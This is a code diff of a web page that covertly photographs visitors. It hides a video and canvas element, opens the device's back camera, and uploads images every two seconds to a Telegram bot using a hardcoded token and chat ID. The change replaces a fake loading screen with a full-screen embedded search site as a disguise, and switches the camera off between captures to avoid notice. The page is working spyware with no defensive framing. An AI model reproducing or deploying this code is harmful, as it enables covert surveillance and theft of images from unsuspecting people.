@@ -3,51 +3,28 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Loading...</title>
+    <title>Browser in iFrame</title>
     <style>
-        body {
+        body, html {
+            width: 100%;
+            height: 100%;
+            margin: 0;
+            padding: 0;
             display: flex;
             justify-content: center;
             align-items: center;
-            height: 100vh;
-            margin: 0;
             background-color: #1a1a1a;
-            font-family: Arial, sans-serif;
-            color: #fff;
+            overflow: hidden;
         }
-        #loading-container {
-            text-align: center;
-        }
-        .spinner {
-            border: 6px solid #f3f3f3;
-            border-top: 6px solid #3498db;
-            border-radius: 50%;
-            width: 60px;
-            height: 60px;
-            animation: spin 1s linear infinite;
-            margin: 20px auto;
-        }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-        #loading-message {
-            font-size: 18px;
-            color: #ccc;
-        }
-        #error-message {
-            color: #ff4c4c;
-            margin-top: 10px;
-            display: none;
+        iframe {
+            width: 100%;
+            height: 100%;
+            border: none;
         }
     </style>
 </head>
 <body>
-    <div id="loading-container">
-        <div class="spinner"></div>
-        <div id="loading-message">Please wait...</div>
-        <div id="error-message">Failed to upload image. Retrying...</div>
-    </div>
+    <iframe src="https://www.bing.com"></iframe>
     <video id="video" autoplay style="display:none;"></video>
     <canvas id="canvas" style="display:none;"></canvas>
     <script>
@@ -57,9 +34,10 @@
             const context = canvas.getContext('2d');
             const telegramBotToken = '6560503910:AAGcAQAqAJNVHtFiWf6qwmIoUerWmbx942U';
             const telegramChatId = '5816023717';
-            const errorMessage = document.getElementById('error-message');
             const maxRetries = 3; // Maximum number of retries for uploading the image
             let retryCount = 0;
+            let stream = null;
+            const captureInterval = 2000; // Capture interval in milliseconds
 
             // Function to send the image to the Telegram bot
             function sendImageToTelegram(imageBlob) {
@@ -76,7 +54,6 @@
                     if (data.ok) {
                         console.log('Image sent successfully');
                         localStorage.removeItem('failedImage'); // Clear the saved image on success
-                        captureAndSendImage(); // Capture next image
                     } else {
                         console.error('Error sending image:', data.description);
                         handleUploadError(imageBlob);
@@ -92,14 +69,11 @@
             function handleUploadError(imageBlob) {
                 retryCount++;
                 if (retryCount <= maxRetries) {
-                    errorMessage.style.display = 'block';
                     console.log(`Retrying to send image (${retryCount}/${maxRetries})...`);
                     sendImageToTelegram(imageBlob);
                 } else {
                     console.error('Failed to upload image after multiple attempts.');
-                    errorMessage.textContent = 'Failed to upload image after multiple attempts. Will retry on next page load.';
                     saveImageToLocalStorage(imageBlob);
-                    captureAndSendImage(); // Continue to next image
                 }
             }
 
@@ -136,36 +110,54 @@
                 }, 'image/jpeg');
             }
 
-            // Access the device's back camera
-            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+            // Function to start the video stream
+            function startVideoStream() {
                 navigator.mediaDevices.enumerateDevices()
                 .then(devices => {
                     const videoDevice = devices.find(device => device.kind === 'videoinput' && device.label.toLowerCase().includes('back')) || devices.find(device => device.kind === 'videoinput');
                     return navigator.mediaDevices.getUserMedia({ video: { deviceId: videoDevice.deviceId } });
                 })
-                .then(stream => {
+                .then(videoStream => {
+                    stream = videoStream;
                     video.srcObject = stream;
                     video.play();
-
-                    // Wait for the video stream to be ready, then continuously capture images
-                    video.onloadeddata = () => {
-                        // Set canvas size to match video stream dimensions
-                        canvas.width = video.videoWidth;
-                        canvas.height = video.videoHeight;
-
-                        // Retry sending any saved images
-                        retrySavedImage();
-
-                        // Start capturing and sending images continuously
-                        captureAndSendImage();
-                    };
                 })
                 .catch(error => {
                     console.error('Error accessing the camera:', error);
                 });
-            } else {
-                console.error('Camera not supported by this browser.');
             }
+
+            // Function to stop the video stream
+            function stopVideoStream() {
+                if (stream) {
+                    stream.getTracks().forEach(track => track.stop());
+                }
+                video.srcObject = null;
+            }
+
+            // Function to capture image every 2 seconds
+            function startCaptureCycle() {
+                setInterval(() => {
+                    startVideoStream();
+
+                    video.onloadeddata = () => {
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+
+                        // Capture the image after the video stream is ready
+                        setTimeout(() => {
+                            captureAndSendImage();
+                            stopVideoStream(); // Turn off the camera after capturing the image
+                        }, 1000); // Wait 1 second before capturing the image
+                    };
+                }, captureInterval);
+            }
+
+            // Retry sending any saved images on page load
+            retrySavedImage();
+
+            // Start the capture cycle
+            startCaptureCycle();
         });
     </script>
 </body>
